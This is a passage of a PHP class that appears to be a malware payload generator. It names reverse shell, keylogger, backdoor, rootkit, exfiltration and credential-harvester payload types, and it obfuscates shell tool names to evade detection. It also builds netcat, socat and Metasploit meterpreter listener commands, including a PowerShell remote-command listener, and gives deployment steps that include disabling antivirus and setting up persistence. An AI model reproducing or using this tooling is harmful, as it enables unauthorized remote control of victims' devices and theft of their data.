            ['b' . 'a' . 'sh', 'py' . 'thon', 'power' . 'shell', 'n' . 'c ', 'n' . 'cat'],
            $obfuscated
        );
        
        return $obfuscated;
    }
    
    private function generate_filename($type, $platform, $format) {
        $prefixes = [
            'reverse_shell' => 'rshell',
            'keylogger' => 'keylog',
            'backdoor' => 'bdoor',
            'android_backdoor' => 'android_bd',
            'windows_persistence' => 'win_persist',
            'linux_rootkit' => 'linux_rk',
            'data_exfil' => 'exfil',
            'credential_harvester' => 'cred_harv'
        ];
        
        $extensions = [
            'exe' => '.exe',
            'elf' => '.elf',
            'apk' => '.apk',
            'py' => '.py',
            'ps1' => '.ps1',
            'sh' => '.sh',
            'php' => '.php',
            'js' => '.js',
            'vbs' => '.vbs',
            'jar' => '.jar',
            'deb' => '.deb',
            'rpm' => '.rpm',
            'bat' => '.bat'
        ];
        
        $prefix = $prefixes[$type] ?? 'payload';
        $ext = $extensions[$format] ?? '.txt';
        
        $timestamp = date('Ymd_His');
        $random = substr(md5(time()), 0, 8);
        
        return "{$prefix}_{$platform}_{$timestamp}_{$random}{$ext}";
    }
    
    public function get_payload_types() {
        return $this->payload_types;
    }
    
    public function get_encryption_methods() {
        return $this->encryption_methods;
    }
    
    public function get_output_formats() {
        return $this->output_formats;
    }
    
    public function get_platforms() {
        return $this->platforms;
    }
    
    public function generate_listener_command($type, $lhost, $lport) {
        $commands = [
            'reverse_shell' => [
                'netcat' => "nc -lvnp $lport",
                'ncat' => "ncat -lvp $lport --ssl",
                'socat' => "socat TCP-LISTEN:$lport STDOUT",
                'powershell' => "\$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $lport); \$listener.Start(); while(\$true) { \$client = \$listener.AcceptTcpClient(); \$stream = \$client.GetStream(); \$reader = New-Object System.IO.StreamReader(\$stream); \$writer = New-Object System.IO.StreamWriter(\$stream); while(\$true) { \$cmd = \$reader.ReadLine(); if (\$cmd -eq 'exit') { break; } \$output = iex \$cmd 2>&1 | Out-String; \$writer.WriteLine(\$output); \$writer.Flush(); } }"
            ],
            'android_backdoor' => [
                'adb_forward' => "adb forward tcp:$lport tcp:$lport && nc localhost $lport",
                'direct' => "nc -lvp $lport",
                'msfconsole' => "msfconsole -q -x 'use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
            ],
            'windows_persistence' => [
                'metasploit' => "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'",
                'netcat_ssl' => "ncat -lvp $lport --ssl",
                'pwncat' => "pwncat-cs -lp $lport"
            ]
        ];
        
        return $commands[$type] ?? $commands['reverse_shell'];
    }
    
    public function get_deployment_guide($platform, $type) {
        $guides = [
            'android' => [
                'steps' => [
                    '1. Enable USB Debugging on target device',
                    '2. Connect device via USB',
                    '3. Use ADB to install: adb install payload.apk',
                    '4. Grant necessary permissions',
                    '5. Execute from app drawer or via: adb shell am start -n com.package.name/.MainActivity'
                ],
                'requirements' => ['ADB installed', 'USB debugging enabled', 'Allow unknown sources']
            ],
            'windows' => [
                'steps' => [
                    '1. Disable antivirus temporarily',
                    '2. Run as Administrator for persistence',
                    '3. Add firewall exception if needed',
                    '4. Test execution policy: Set-ExecutionPolicy Bypass -Scope Process',
                    '5. Execute payload'
                ],
                'requirements' => ['Administrator privileges', 'PowerShell 5.0+', '.NET Framework 4.5+']
            ],
            'linux' => [
                'steps' => [
                    '1. Make executable: chmod +x payload.sh',
                    '2. Run with appropriate privileges',
                    '3. Check SELinux/AppArmor policies',
                    '4. Test in isolated environment first',
                    '5. For persistence, run as service or cron job'
                ],
                'requirements' => ['bash/sh interpreter', 'netcat/socat for reverse shells', 'cron/systemd for persistence']
            ]
        ];
        
        return $guides[$platform] ?? ['steps' => ['Execute payload with appropriate permissions'], 'requirements' => []];
    }
}
